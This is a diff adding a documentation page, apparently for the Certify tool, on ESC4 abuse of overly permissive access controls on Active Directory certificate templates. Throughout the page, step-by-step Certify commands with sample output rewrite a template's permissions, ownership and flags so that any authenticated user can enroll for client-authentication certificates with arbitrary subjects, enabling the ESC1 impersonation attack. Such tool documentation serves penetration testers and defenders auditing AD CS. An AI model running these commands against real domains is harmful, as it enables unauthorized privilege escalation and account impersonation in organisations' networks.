@@ -1,0 +1,238 @@
+---
+title: 'ESC4 - Vulnerable Certificate Template Access Control'
+description: 'Exploit overly permissive access controls on certificate template domain objects to modify templates and enable other escalation techniques'
+icon: 'shield-exclamation'
+sidebarTitle: 'ESC4'
+---
+
+ESC4 is a misconfiguration in Active Directory Certificate Services (AD CS), which stems from overly permissive access controls on certificate template domain objects. Specifically, if a principal has the privileges to control the attributes of a certificate template object, they can modify the template to match the abuse criteria for any of the following escalation techniques:
+
+<Info>
+ESC4 can be leveraged to enable the following escalation techniques:
+- [ESC1](./esc1-misconfigured-client-authentication), [ESC2](./esc2-misconfigured-any-purpose), [ESC3](./esc3-misconfigured-certificate-request-agent), [ESC9](./esc9-security-extension-disabled-on-certificate-template), [ESC13](./esc13-authentication-mechanism-assurance-ama), and [ESC15](./esc15-ekuwu-application-policy-injection).
+</Info>
+
+Any of the following rights, when misconfigured, comprise an ESC4 vulnerability:
+
+<Accordion title="ESC4 Vulnerable Rights">
+| Right | Description |
+| ----- | ------ |
+| `Owner` | The principal has implicit full control of the object and can edit any property. |
+| `Full Control` | The principal has full control of the object and can edit any property. |
+| `Write Property` | The principal has generic write on the object and can edit any property. |
+| `Write Owner` | The principal can change the owner of the object. |
+| `Write Dacl` | The principal can modify the access controls of the object. |
+</Accordion>
+
+We can search for certificate templates with misconfigured access controls using the `enum-templates --filter-vulnerable` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Listing info about the enterprise certificate authority 'CORP-CA01-CA'
+
+    ...
+
+[*] Certificate templates found using the current filter parameters:
+
+    Template Name                         : CustomInsecure
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    Certificate Name Flag                 : NONE
+    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PEND_ALL_REQUESTS, PUBLISH_TO_DS
+    Manager Approval Required             : False
+    Authorized Signatures Required        : 0
+    Extended Key Usage                    : Server Authentication
+    Certificate Application Policies      : Server Authentication
+    Vulnerabilities
++     ESC4                                : The template has insecure delegated permissions.
+    Permissions
+      Enrollment Permissions
+      Object Control Permissions
++       Owner                       : NT AUTHORITY\Authenticated Users   S-1-5-11
++       Full Control                : NT AUTHORITY\Authenticated Users   S-1-5-11
++       Write Owner                 : NT AUTHORITY\Authenticated Users   S-1-5-11
++       Write Dacl                  : NT AUTHORITY\Authenticated Users   S-1-5-11
++       Write Property              : NT AUTHORITY\Authenticated Users   S-1-5-11
+
+Certify completed in 00:00:00.6049527
+```
+</CodeGroup>
+
+<Warning>
+As seen in the `Object Control Permissions` section, arbitrary principals can have delegated rights on certificate template objects. The abuse scenario for this vulnerability can vary depending on the delegated permission, but the overall idea is to modify a template so it can facilitate another escalation technique and then carrying out the abuse scenario for the respective technique.
+</Warning>
+
+## Full Control / Write Property
+
+If a principal has `Full Control` or `Write Property` rights, they have the ability to edit any property on the certificate template domain object, making it fairly straight forward to obtain the desirable abuse scenario conditions.
+
+<Accordion title="Steps to Enable ESC1 Abuse Scenario">
+We need to perform the following steps to modify the certificate template to allow the [ESC1](./esc1-misconfigured-client-authentication) abuse scenario:
+
+- **Ensure that our principal has enrollment rights.** This can be granted/revoked using the following Certify command:
+  - `Certify.exe manage-template --template <template> --enroll <sid>`
+- **Ensure that manager approval is disabled.** This can be toggled on/off using the following Certify command:
+  - `Certify.exe manage-template --template <template> --manager-approval`
+- **Ensure that authorized signatures are disabled.** This can be set using the following Certify command:
+  - `Certify.exe manage-template --template <template> --authorized-signatures 0`
+- **Ensure that the template supports client authentication.** This can be toggled on/off using the following Certify command:
+  - `Certify.exe manage-template --template <template> --client-auth --pkinit-auth --smartcard-logon`
+- **Ensure that the enrollees can supply subject details.** This can be toggled on/off using the following Certify command:
+  - `Certify.exe manage-template --template <template> --supply-subject`
+</Accordion>
+
+For more information about the `manage-template` command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Listing info about the enterprise certificate authority 'CORP-CA01-CA'
+
+    ...
+
+[*] Certificate templates found using the current filter parameters:
+
+    Template Name                         : CustomInsecure
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
++   Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
+    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
++   Manager Approval Required             : False
++   Authorized Signatures Required        : 0
++   Extended Key Usage                    : Client Authentication, Server Authentication
+    Certificate Application Policies      : Client Authentication, Server Authentication
+    Vulnerabilities
++     ESC1                                : The template has a client authentication EKU and allows enrollees to supply subject.
+      ESC4                                : The template has insecure delegated permissions.
+    Permissions
+      Enrollment Permissions
++       All Extended Rights         : NT AUTHORITY\Authenticated Users   S-1-5-11
+      Object Control Permissions
+        Owner                       : NT AUTHORITY\Authenticated Users   S-1-5-11
+        Full Control                : NT AUTHORITY\Authenticated Users   S-1-5-11
+        Write Owner                 : NT AUTHORITY\Authenticated Users   S-1-5-11
+        Write Dacl                  : NT AUTHORITY\Authenticated Users   S-1-5-11
+        Write Property              : NT AUTHORITY\Authenticated Users   S-1-5-11
+
+Certify completed in 00:00:00.6256944
+```
+</CodeGroup>
+
+<Info>
+Once the template fits the abuse criteria for [ESC1](./esc1-misconfigured-client-authentication), it is possible to carry out the respective abuse scenario.
+</Info>
+
+## Owner / Write Dacl
+
+If a principal has `Owner` or `Write Dacl` rights, they can modify the access controls of the certificate template domain object.
+
+This can be leveraged to grant a principal the `Write Property` right using the following Certify command:
+- `Certify.exe manage-template --template <template> --write-property <sid>`
+
+<CodeGroup>
+```bash Command
+Certify.exe manage-template --template CustomInsecure --write-property S-1-5-11
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Manage a certificate template
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+
+[*] Attempting to toggle security permissions on the CA.
+[*] Successfully modified the certificate template.
+
+Certify completed in 00:00:00.1995684
+```
+</CodeGroup>
+
+<Info>
+Now that we have obtained `Write Property` rights, we can circle back to [Full Control / Write Property](#full-control-%2F-write-property).
+</Info>
+
+## Write Owner
+
+If a principal has `Write Owner` rights, they can modify the owner of the certificate template domain object.
+
+This can be leveraged to grant a principal the `Owner` right using the following Certify command:
+- `Certify.exe manage-template --template <template> --owner <sid>`
+
+<CodeGroup>
+```bash Command
+Certify.exe manage-template --template CustomInsecure --owner S-1-5-11
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Manage a certificate template
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+
+[*] Attempting to toggle security permissions on the CA.
+[*] Successfully modified the certificate template.
+
+Certify completed in 00:00:00.1802428
+```
+</CodeGroup>
+
+<Info>
+Now that we have obtained `Owner` rights, we can circle back to [Owner / Write Dacl](#owner-%2F-write-dacl).
+</Info>
